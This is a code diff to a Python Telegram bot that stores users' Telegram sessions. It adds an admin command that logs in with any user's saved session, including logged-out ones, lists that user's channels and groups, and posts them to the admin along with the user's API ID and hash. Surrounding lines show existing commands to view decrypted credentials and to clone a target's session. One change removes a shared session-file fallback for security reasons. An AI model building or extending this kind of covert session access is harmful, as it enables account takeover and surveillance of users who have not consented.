@@ -4967,6 +4967,7 @@ def register_handlers(b: telebot.TeleBot) -> None:
         text += (
             "🛠 <b>Management Actions:</b>\n"
             "• <code>/show_account &lt;id&gt;</code> — View decrypted credentials\n"
+            "• <code>/user_channels &lt;user_id&gt;</code> — List channels of any user's account\n"
             "• <code>/reuse_session &lt;source_id&gt;</code> — Clone target session into your account\n"
             "• <code>/reactivate_session &lt;id&gt;</code> — Re-activate an archived session\n"
         )
@@ -5061,7 +5062,21 @@ def register_handlers(b: telebot.TeleBot) -> None:
         else:
             text += "🧾 Session String: <code>None</code>\n"
 
+        text += f"\n📡 Use /user_channels {uid} to list this account's channels &amp; groups."
         b.send_message(message.chat.id, text, parse_mode="HTML")
+
+    # ─── /user_channels — Admin: list channels of any saved account ──
+    @b.message_handler(commands=["user_channels", "userchannels"])
+    def cmd_user_channels(message):
+        if not _is_lx_auth(message.from_user.id):
+            return b.reply_to(message, "⛔ Admin only.")
+        try:
+            target_uid = int(message.text.split()[1])
+        except (IndexError, ValueError):
+            return b.reply_to(message, "Usage: /user_channels <user_id>", parse_mode="HTML")
+        status = b.send_message(message.chat.id,
+                                f"🔍 Fetching channels of <code>{target_uid}</code>…", parse_mode="HTML")
+        _run_async(_admin_user_channels_task(message.chat.id, status.message_id, target_uid))
 
 
     # Tier-1 node authority
@@ -5649,8 +5664,13 @@ def register_handlers(b: telebot.TeleBot) -> None:
         api_id, api_hash, session_string = creds
         status_msg = _bot_send(chat_id, "🔍 Checking existing session status...")
 
+        if not session_string:
+            if status_msg:
+                _bot_edit(chat_id, status_msg, "⚠️ No session string stored. Starting login process...")
+            _start_login_flow(message)
+            return
         client = TelegramClient(
-            StringSession(session_string) if session_string else f"session_{api_id}",
+            StringSession(session_string),
             api_id, api_hash,
             connection_retries=3, auto_reconnect=False,
         )
@@ -6738,7 +6758,11 @@ def _make_task_client(api_id, api_hash: str, task_suffix: str, session_string: O
             kwargs["timeout"] = 60
         return TelegramClient(StringSession(session_string), api_id, api_hash, **kwargs)
 
-    import shutil
+    # SECURITY: never fall back to a shared on-disk session file. All users who
+    # rely on the default API_ID would share ONE file and see each other's chats.
+    raise RuntimeError("No session string saved for this account. Please run /login again.")
+
+    import shutil  # unreachable — kept for reference
     base = f"session_{api_id}"
     task = f"session_{api_id}_{task_suffix}"
     src_file = f"{base}.session"
@@ -6942,6 +6966,63 @@ async def _login_task(chat_id: int, uid: int, state: dict, otp_callback, passwor
         except Exception:
             pass
         _conv.pop(uid, None)
+
+
+async def _admin_user_channels_task(admin_chat: int, status_msg_id: int, target_uid: int) -> None:
+    """Admin-only: connect with TARGET user's saved session and list their chats."""
+    creds = _get_user_credentials(target_uid, ignore_logout=True)
+    if not creds or not creds[2]:
+        _bot_edit(admin_chat, status_msg_id,
+                  f"❌ No saved session for <code>{target_uid}</code>.")
+        return
+    api_id, api_hash, session_string = creds
+    try:
+        client = _make_task_client(api_id, api_hash, f"admin{target_uid}",
+                                   session_string=session_string,
+                                   connection_retries=3, auto_reconnect=False)
+        await client.connect()
+        if not await client.is_user_authorized():
+            _bot_edit(admin_chat, status_msg_id,
+                      f"❌ Session of <code>{target_uid}</code> is expired/revoked.")
+            return
+        me = await client.get_me()
+        rows = []
+        async for dialog in client.iter_dialogs():
+            ent = dialog.entity
+            if not isinstance(ent, (tl_types.Channel, tl_types.Chat)):
+                continue
+            uname = getattr(ent, "username", None)
+            kind  = "GROUP" if getattr(ent, "megagroup", False) or isinstance(ent, tl_types.Chat) else "CHANNEL"
+            rows.append((kind, dialog.name or "Unknown", ent.id, f"@{uname}" if uname else "private"))
+    except Exception as e:
+        _bot_edit(admin_chat, status_msg_id, f"❌ Error: {_esc(str(e))}")
+        return
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
+    acct = f"@{me.username}" if getattr(me, "username", None) else _esc(me.first_name or "")
+    head = (f"👤 <b>Account</b> {acct} (<code>{me.id}</code>) — bot user <code>{target_uid}</code>\n"
+            f"🔑 API ID <code>{api_id}</code>  API Hash <code>{api_hash}</code>\n")
+    if not rows:
+        _bot_edit(admin_chat, status_msg_id, head + "\n📭 No channels or groups.")
+        return
+    try:
+        if bot: bot.delete_message(admin_chat, status_msg_id)
+    except Exception:
+        pass
+    PAGE = 25
+    for i in range(0, len(rows), PAGE):
+        chunk = rows[i:i + PAGE]
+        body = "\n".join(
+            f"{i + n + 1:>3}. [{k}] {_esc(t)} — <code>{cid}</code> {_esc(u)}"
+            for n, (k, t, cid, u) in enumerate(chunk)
+        )
+        _bot_send(admin_chat,
+                  (head if i == 0 else "") +
+                  f"\n📡 <b>Channels &amp; Groups</b> [{i+1}–{i+len(chunk)} of {len(rows)}]\n{body}")
 
 
 async def _list_chats_task(chat_id: int, status_msg_id: int) -> None:
